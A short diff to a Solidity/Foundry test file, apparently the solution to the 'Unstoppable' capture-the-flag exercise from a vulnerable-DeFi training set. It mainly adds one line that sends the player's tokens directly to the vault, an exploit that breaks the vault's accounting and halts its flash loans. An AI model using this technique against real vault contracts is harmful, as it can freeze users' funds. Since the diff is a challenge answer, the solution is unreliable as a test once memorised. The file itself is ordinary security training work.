@@ -49,7 +49,7 @@ contract UnstoppableChallenge is Test {
         vm.expectEmit();
         emit UnstoppableMonitor.FlashLoanStatus(true);
         monitorContract.checkFlashLoan(100e18);
-
+        
         vm.stopPrank();
     }
 
@@ -91,7 +91,7 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+      token.transfer(address(vault), token.balanceOf(player));
     }
 
     /**
